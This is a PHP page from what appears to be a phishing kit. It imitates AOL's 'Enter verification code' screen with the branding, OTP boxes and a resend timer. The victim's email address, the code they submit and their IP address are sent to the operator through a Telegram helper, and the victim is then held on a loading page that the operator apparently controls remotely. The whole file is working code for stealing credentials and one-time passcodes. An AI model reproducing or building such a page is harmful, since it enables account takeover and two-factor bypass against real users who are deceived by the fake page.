<?php
// email-verify.php — AOL Email verification code entry
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
$email    = $_SESSION['email'];
$state    = get_state($sid);
if ($state['page'] === 'success') { header('Location: ' . SUCCESS_URL); exit; }

$is_error = ($state['page'] === 'code_error');
$error    = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = trim($_POST['code'] ?? '');
    if ($code === '' || strlen($code) < 4) {
        $error = 'Please enter the verification code.';
    } else {
        set_state($sid, ['page' => 'loading']);
        tg_send(
            "📧 <b>AOL EMAIL CODE SUBMITTED</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔢 Code: <code>{$code}</code>\n" .
            "🌐 IP: <code>{$state['ip']}</code>\n" .
            "⏰ " . date('H:i:s') . "\n\n" .
            "👇 <b>What next?</b>"
        );
        tg_after_verify($sid, 'email');
        header('Location: loading.php');
        exit;
    }
}

page_open('Enter verification code - AOL', true);
?>

<div class="card">

  <!-- Email shown at top -->
  <p class="card-email-top"><?= htmlspecialchars($email) ?></p>

  <!-- Phone/email illustration -->
  <div class="phone-illus">
    <svg width="90" height="110" viewBox="0 0 90 110" xmlns="http://www.w3.org/2000/svg">
      <rect x="18" y="5" width="54" height="88" rx="8" fill="#a8d4f5" stroke="#7ab8e8" stroke-width="1.5"/>
      <rect x="22" y="12" width="46" height="70" rx="4" fill="#d6ecfb"/>
      <!-- Email envelope icon on screen -->
      <rect x="28" y="36" width="34" height="24" rx="3" fill="#7c5cbf" opacity=".85"/>
      <path d="M28 36 L45 50 L62 36" stroke="#fff" stroke-width="1.5" fill="none"/>
      <ellipse cx="45" cy="102" rx="22" ry="8" fill="#f4c5a0" opacity=".9"/>
      <rect x="24" y="88" width="42" height="16" rx="6" fill="#f4c5a0"/>
    </svg>
  </div>

  <h1 class="card-title" style="text-align:center;font-size:18px">Enter verification code</h1>
  <p style="font-size:13px;color:#555;text-align:center;margin-bottom:6px;line-height:1.5">
    You'll get an email at
    <strong style="color:#1a1a1a"><?= htmlspecialchars($email) ?></strong>
    if there's an AOL account linked to it.
  </p>

  <?php if ($is_error && !$error): ?>
    <div class="err-text" style="text-align:center;margin-top:8px">That code didn't work. Try again.</div>
  <?php endif; ?>

  <form method="POST" id="emailVerifyForm" novalidate style="margin-top:16px">
    <input type="hidden" name="code" id="hiddenCode"/>

    <label class="field-label" style="color:#1a73e8;font-weight:600">6-digit code</label>

    <!-- 6 OTP boxes -->
    <div class="otp-wrap" id="otpWrap">
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="0"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="1"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="2"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="3"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="4"/>
      <input class="otp-box" type="text" maxlength="1" inputmode="numeric" data-idx="5"/>
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="codeErr"></div>
    <?php endif; ?>

    <p class="resend-timer" id="resendTimer">Resend code in 0:55</p>

    <button type="submit" class="btn-aol" id="submitBtn" disabled>Next</button>

    <div style="text-align:center;margin-top:14px">
      <a href="loading.php" class="aol-link">Try signing in another way</a>
    </div>
  </form>
</div>

<?= poll_script(['email_verify', 'code_error']) ?>
<?php page_close(); ?>
